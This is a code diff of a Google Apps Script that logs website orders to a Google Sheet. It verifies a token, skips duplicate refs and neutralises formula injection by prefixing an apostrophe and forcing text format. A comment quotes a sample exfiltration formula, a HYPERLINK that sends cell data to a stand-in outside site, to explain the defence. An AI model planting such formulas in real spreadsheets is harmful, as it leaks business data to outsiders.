@@ -1,196 +1,251 @@
 /**
- * Registro de cotizaciones — script de Google Apps Script.
+ * SONORO — Registro de pedidos
  *
- * Recibe lo que manda app/api/quote-log/route.ts y escribe una fila por línea
- * del pedido. Este archivo NO se ejecuta desde el repositorio: vive acá para
- * que quede versionado y revisable, pero corre pegado en el editor de Apps
- * Script del documento de Google.
+ * Recibe los pedidos generados por el sitio y escribe una fila por pedido.
  *
- * Lo que llega (ya validado y acotado del lado del sitio, lib/quoteLog/):
+ * Este archivo NO se ejecuta desde el repositorio: es la copia versionada de
+ * lo que está pegado en el editor de Apps Script de la hoja «SONORO —
+ * Pedidos». Si se edita allá, hay que traer el cambio acá, y al revés.
  *
- *   { token, ref, items: [{ sku, nombre, qty, unitPriceCents }],
- *     subtotalCents, userAgent }
- *
- * TRES COSAS QUE ESTE SCRIPT TIENE QUE HACER, y por qué:
- *
- * 1. ESCRIBIR TEXTO, NUNCA FÓRMULA. `nombre`, `sku` y `userAgent` los controla
- *    quien manda la petición. En una hoja de cálculo, un valor que empieza con
- *    `=`, `+`, `-` o `@` no es texto: se ejecuta. Un `=IMPORTXML(...)` en una
- *    celda convierte la hoja en un canal para sacar datos hacia afuera. Por eso
- *    las columnas de texto se formatean como texto ANTES de escribir y además
- *    se les antepone un apóstrofo cuando empiezan con uno de esos caracteres.
- *
- * 2. VERIFICAR EL TOKEN antes de escribir nada. La URL del script es pública
- *    —tiene que serlo para que el sitio pueda llamarla— así que el token es lo
- *    único que distingue una cotización real de cualquiera que descubra la URL.
- *
- * 3. DESCARTAR REPETIDOS por `ref`. El reenvío puede llegar dos veces si la
- *    red reintenta, y un pedido contado dos veces ensucia justo los números
- *    por los que existe este registro.
- *
- * INSTALACIÓN (una sola vez)
- *
- *   1. Extensiones → Apps Script en la hoja de cálculo.
- *   2. Pegar este archivo completo, reemplazando lo que haya.
- *   3. Configuración del proyecto → Propiedades del script → agregar
- *      QUOTE_LOG_TOKEN con el MISMO valor que está en Vercel.
- *   4. Implementar → Nueva implementación → Aplicación web:
+ * INSTALACIÓN
+ *   1. Hoja nueva en Google Sheets: «SONORO — Pedidos»
+ *   2. Extensiones → Apps Script. Borra el contenido y pega este archivo.
+ *   3. Ejecuta la función `configurar` UNA VEZ (menú desplegable → configurar → ▶).
+ *      Autoriza los permisos que pida. Copia el token que imprime en el registro.
+ *   4. Implementar → Nueva implementación → tipo «Aplicación web»
  *        Ejecutar como: Yo
- *        Quién tiene acceso: Cualquier usuario
- *      Copiar la URL que termina en /exec → esa es QUOTE_LOG_URL en Vercel.
- *   5. Cada vez que se edite este script hay que volver a implementar
- *      (Implementar → Administrar implementaciones → editar → Versión nueva),
- *      o el sitio seguirá hablando con la versión vieja.
+ *        Quién tiene acceso: Cualquier persona
+ *   5. Copia la URL y guárdala junto con el token en .env.local:
+ *        QUOTE_LOG_URL=https://script.google.com/macros/s/.../exec
+ *        QUOTE_LOG_TOKEN=<el token del paso 3>
+ *
+ * IMPORTANTE
+ *   Cada vez que edites este archivo debes volver a implementar
+ *   (Implementar → Administrar implementaciones → editar → Versión: Nueva).
+ *   Guardar no basta: la URL sigue sirviendo la versión anterior.
  */
 
-/** Nombre de la pestaña donde se escribe. Se crea sola si no existe. */
-const HOJA = "Cotizaciones";
+const HOJA = 'PEDIDOS';
+const ZONA = 'America/Guatemala';
 
 const ENCABEZADOS = [
-  "Fecha",
-  "Ref",
-  "SKU",
-  "Producto",
-  "Cantidad",
-  "Precio unitario",
-  "Total línea",
-  "Total pedido",
-  "Navegador",
+  'Fecha',
+  'Ref',
+  'Unidades',
+  'Subtotal (Q)',
+  'Productos',
+  'SKUs',
+  'Origen',
 ];
 
-/** Columnas (1-based) que llevan texto controlado por el cliente. */
-const COLUMNAS_DE_TEXTO = [2, 3, 4, 9];
+/**
+ * Columnas que llevan texto venido del cliente. Se formatean como TEXTO para
+ * que la hoja no interprete nada de lo que llegue — ver `sanear`.
+ * Fecha (1) y los números (3, 4) quedan fuera a propósito: se quieren como
+ * fecha y como número, para ordenar y sumar.
+ */
+const COLUMNAS_DE_TEXTO = [2, 5, 6, 7];
 
-function doPost(peticion) {
-  // Una cotización a la vez: dos que lleguen juntas podrían leer la misma
-  // última fila y pisarse, o colar dos veces el mismo `ref`.
-  const candado = LockService.getScriptLock();
-  try {
-    candado.waitLock(20000);
-  } catch (error) {
-    return responder({ ok: false, motivo: "ocupado" });
+/**
+ * Ejecutar una sola vez, a mano, desde el editor.
+ * Genera el token compartido y prepara la hoja.
+ */
+function configurar() {
+  const props = PropertiesService.getScriptProperties();
+  let token = props.getProperty('QUOTE_LOG_TOKEN');
+
+  if (!token) {
+    token = Utilities.getUuid().replace(/-/g, '');
+    props.setProperty('QUOTE_LOG_TOKEN', token);
   }
 
-  try {
-    const cuerpo = leerCuerpo(peticion);
-    if (!cuerpo) return responder({ ok: false, motivo: "cuerpo" });
+  obtenerHoja();
 
-    const esperado = PropertiesService.getScriptProperties().getProperty("QUOTE_LOG_TOKEN");
-    // Sin detalle en la respuesta: a quien no tiene el token no se le explica
-    // qué le falta.
-    if (!esperado || cuerpo.token !== esperado) return responder({ ok: false });
-
-    const ref = String(cuerpo.ref || "").trim();
-    const items = Array.isArray(cuerpo.items) ? cuerpo.items : [];
-    if (!ref || items.length === 0) return responder({ ok: false, motivo: "vacío" });
-
-    const hoja = hojaDeCotizaciones();
-    if (yaRegistrado(hoja, ref)) return responder({ ok: true, repetido: true });
-
-    escribir(hoja, ref, items, cuerpo);
-    return responder({ ok: true, filas: items.length });
-  } catch (error) {
-    // El sitio ignora el cuerpo de la respuesta y nunca se lo muestra a nadie;
-    // esto queda en el registro de ejecuciones de Apps Script.
-    console.error("quote-log: " + error);
-    return responder({ ok: false, motivo: "error" });
-  } finally {
-    candado.releaseLock();
-  }
+  Logger.log('QUOTE_LOG_TOKEN=' + token);
+  Logger.log('Copia esa línea a tu .env.local y a las variables de entorno de Vercel.');
 }
 
-/** GET no hace nada: la URL solo existe para recibir cotizaciones. */
-function doGet() {
-  return responder({ ok: false, motivo: "método" });
-}
-
-function leerCuerpo(peticion) {
-  if (!peticion || !peticion.postData || !peticion.postData.contents) return null;
-  try {
-    const cuerpo = JSON.parse(peticion.postData.contents);
-    return cuerpo && typeof cuerpo === "object" ? cuerpo : null;
-  } catch (error) {
-    return null;
-  }
-}
-
-function hojaDeCotizaciones() {
+function obtenerHoja() {
   const libro = SpreadsheetApp.getActiveSpreadsheet();
   let hoja = libro.getSheetByName(HOJA);
+
   if (!hoja) {
     hoja = libro.insertSheet(HOJA);
-    hoja.appendRow(ENCABEZADOS);
-    hoja.setFrozenRows(1);
   }
+
+  if (hoja.getLastRow() === 0) {
+    hoja.appendRow(ENCABEZADOS);
+    const cabecera = hoja.getRange(1, 1, 1, ENCABEZADOS.length);
+    cabecera.setFontWeight('bold');
+    cabecera.setBackground('#0B0B0C');
+    cabecera.setFontColor('#FFFFFF');
+    hoja.setFrozenRows(1);
+    hoja.setColumnWidth(1, 150); // Fecha
+    hoja.setColumnWidth(2, 110); // Ref
+    hoja.setColumnWidth(5, 380); // Productos
+    hoja.setColumnWidth(6, 200); // SKUs
+    hoja.setColumnWidth(7, 240); // Origen
+    hoja.getRange('D:D').setNumberFormat('#,##0.00');
+  }
+
+  // En cada llamada, no solo al crear la hoja: si alguien cambia el formato de
+  // una de estas columnas a mano, la siguiente escritura lo repone. Es barato
+  // y es la mitad de la defensa contra fórmulas (la otra mitad es `sanear`).
+  for (let i = 0; i < COLUMNAS_DE_TEXTO.length; i++) {
+    const letra = String.fromCharCode(64 + COLUMNAS_DE_TEXTO[i]);
+    hoja.getRange(letra + '2:' + letra).setNumberFormat('@');
+  }
+
   return hoja;
 }
 
-/** ¿Ya entró este pedido? Se compara contra la columna Ref. */
-function yaRegistrado(hoja, ref) {
+/**
+ * Deja un valor como TEXTO PLANO, listo para una celda.
+ *
+ * En una hoja de cálculo, un valor que empieza con `=`, `+`, `-` o `@` no es
+ * texto: se ejecuta. Y hay dos campos de esta fila que los controla por
+ * completo quien manda la petición — `ref` y el navegador, que va a la
+ * columna Origen. Un `=HYPERLINK("https://sitio-ajeno/?d="&A2,"ver")` ahí
+ * convierte la hoja en un canal para sacar datos hacia afuera, y basta con
+ * que alguien de la casa haga clic.
+ *
+ * El apóstrofo delante NO se ve en la celda: le dice a la hoja «esto es
+ * texto». Va además del formato `@` de la columna, porque los dos fallan de
+ * maneras distintas: el formato se puede cambiar a mano desde la hoja, y el
+ * apóstrofo se pierde si alguien copia la celda y la pega como valor.
+ */
+function sanear(valor, maximo) {
+  const texto = String(valor == null ? '' : valor).slice(0, maximo || 200);
+  return /^[=+\-@\t\r]/.test(texto) ? "'" + texto : texto;
+}
+
+/** ¿Este pedido ya está en la hoja? Se compara contra la columna Ref. */
+function refYaRegistrado(hoja, ref) {
   const ultima = hoja.getLastRow();
   if (ultima < 2) return false;
+
   const refs = hoja.getRange(2, 2, ultima - 1, 1).getValues();
   for (let i = 0; i < refs.length; i++) {
+    // El apóstrofo de `sanear` no viaja en el valor leído, así que comparar
+    // en crudo alcanza.
     if (String(refs[i][0]).trim() === ref) return true;
   }
   return false;
 }
 
-function escribir(hoja, ref, items, cuerpo) {
-  const ahora = new Date();
-  const totalPedido = centavosAQuetzales(cuerpo.subtotalCents);
-  const navegador = texto(cuerpo.userAgent);
+function respuesta(ok, mensaje, extra) {
+  const cuerpo = Object.assign({ ok: ok, mensaje: mensaje }, extra || {});
+  return ContentService
+    .createTextOutput(JSON.stringify(cuerpo))
+    .setMimeType(ContentService.MimeType.JSON);
+}
 
-  const filas = items.map(function (item) {
-    const cantidad = Number(item.qty) || 0;
-    const unitario = centavosAQuetzales(item.unitPriceCents);
-    return [
-      ahora,
-      texto(ref),
-      texto(item.sku),
-      texto(item.nombre),
-      cantidad,
-      unitario,
-      cantidad * unitario,
-      totalPedido,
-      navegador,
+function doPost(e) {
+  try {
+    if (!e || !e.postData || !e.postData.contents) {
+      return respuesta(false, 'Cuerpo vacío');
+    }
+
+    let datos;
+    try {
+      datos = JSON.parse(e.postData.contents);
+    } catch (err) {
+      return respuesta(false, 'JSON inválido');
+    }
+
+    // Token compartido. Sin esto, cualquiera que descubra la URL puede
+    // escribir filas en la hoja.
+    const esperado = PropertiesService.getScriptProperties().getProperty('QUOTE_LOG_TOKEN');
+    if (!esperado) {
+      return respuesta(false, 'Script sin configurar: ejecuta configurar() una vez');
+    }
+    if (datos.token !== esperado) {
+      return respuesta(false, 'No autorizado');
+    }
+
+    const ref = String(datos.ref || '').slice(0, 40);
+    if (!ref) {
+      return respuesta(false, 'Falta ref');
+    }
+
+    const items = Array.isArray(datos.items) ? datos.items : [];
+    if (items.length === 0) {
+      return respuesta(false, 'Pedido sin líneas');
+    }
+
+    // Fecha: se usa la del servidor, no la que manda el cliente.
+    // El reloj del navegador no es una fuente de verdad.
+    const fecha = Utilities.formatDate(new Date(), ZONA, 'yyyy-MM-dd HH:mm:ss');
+
+    let unidades = 0;
+    const lineas = [];
+    const skus = [];
+
+    for (let i = 0; i < items.length; i++) {
+      const it = items[i] || {};
+      const sku = String(it.sku || '?').slice(0, 40);
+      const nombre = String(it.nombre || '').slice(0, 120);
+      const qty = Number(it.qty) || 0;
+      const cents = Number(it.unitPriceCents) || 0;
+
+      unidades += qty;
+      skus.push(sku);
+      lineas.push(qty + 'x ' + sku + ' — ' + nombre + ' @ Q ' + (cents / 100).toFixed(2));
+    }
+
+    // El subtotal se RECALCULA aquí en vez de confiar en el que manda el
+    // cliente. Si no coincide, se registra la discrepancia en Origen.
+    let subtotalCents = 0;
+    for (let i = 0; i < items.length; i++) {
+      const it = items[i] || {};
+      subtotalCents += (Number(it.qty) || 0) * (Number(it.unitPriceCents) || 0);
+    }
+
+    const enviado = Number(datos.subtotalCents);
+    let origen = String(datos.userAgent || '').slice(0, 200);
+    if (!isNaN(enviado) && enviado !== subtotalCents) {
+      origen = '[subtotal recibido: ' + (enviado / 100).toFixed(2) + '] ' + origen;
+    }
+
+    const fila = [
+      fecha,
+      sanear(ref, 40),
+      unidades,
+      subtotalCents / 100,
+      sanear(lineas.join('\n'), 2000),
+      sanear(skus.join(', '), 400),
+      sanear(origen, 240),
     ];
-  });
 
-  const primera = hoja.getLastRow() + 1;
-  const rango = hoja.getRange(primera, 1, filas.length, ENCABEZADOS.length);
+    // Dos pedidos simultáneos pueden escribir en la misma fila si no se
+    // serializa el acceso. El candado cubre también la comprobación de
+    // repetidos: sin él, dos reenvíos del mismo pedido podrían leer los dos
+    // que «no está» y escribirlo dos veces.
+    const lock = LockService.getScriptLock();
+    try {
+      lock.waitLock(10000);
+      const hoja = obtenerHoja();
+      // El reenvío puede llegar dos veces si la red reintenta, y un pedido
+      // contado doble ensucia justo los números por los que existe la hoja.
+      if (refYaRegistrado(hoja, ref)) {
+        return respuesta(true, 'Repetido, no se escribió', { ref: ref });
+      }
+      hoja.appendRow(fila);
+    } finally {
+      lock.releaseLock();
+    }
 
-  // EL ORDEN IMPORTA: el formato de texto va ANTES de escribir. Puesto
-  // después, la hoja ya habría interpretado un `=` como fórmula.
-  COLUMNAS_DE_TEXTO.forEach(function (columna) {
-    hoja.getRange(primera, columna, filas.length, 1).setNumberFormat("@");
-  });
-  hoja.getRange(primera, 1, filas.length, 1).setNumberFormat("yyyy-mm-dd hh:mm:ss");
-  [6, 7, 8].forEach(function (columna) {
-    hoja.getRange(primera, columna, filas.length, 1).setNumberFormat('"Q" #,##0.00');
-  });
-
-  rango.setValues(filas);
+    return respuesta(true, 'Registrado', { ref: ref });
+  } catch (err) {
+    // Nunca lanzar: el sitio no debe recibir un 500 por un fallo de registro.
+    return respuesta(false, 'Error interno: ' + err);
+  }
 }
 
 /**
- * Deja el valor como texto plano. El apóstrofo delante no se ve en la celda:
- * le dice a la hoja «esto es texto», y es el segundo cerrojo por si alguien
- * cambia el formato de la columna más adelante.
+ * Verificación rápida desde el navegador: abre la URL de la implementación
+ * y debe responder que el servicio está activo.
  */
-function texto(valor) {
-  const limpio = String(valor == null ? "" : valor);
-  return /^[=+\-@\t\r]/.test(limpio) ? "'" + limpio : limpio;
-}
-
-/** El sitio manda centavos enteros (CLAUDE.md § Formato de precio). */
-function centavosAQuetzales(centavos) {
-  const numero = Number(centavos);
-  return Number.isFinite(numero) ? numero / 100 : 0;
-}
-
-function responder(datos) {
-  return ContentService.createTextOutput(JSON.stringify(datos)).setMimeType(
-    ContentService.MimeType.JSON,
-  );
+function doGet() {
+  return respuesta(true, 'Servicio de registro de pedidos activo');
 }
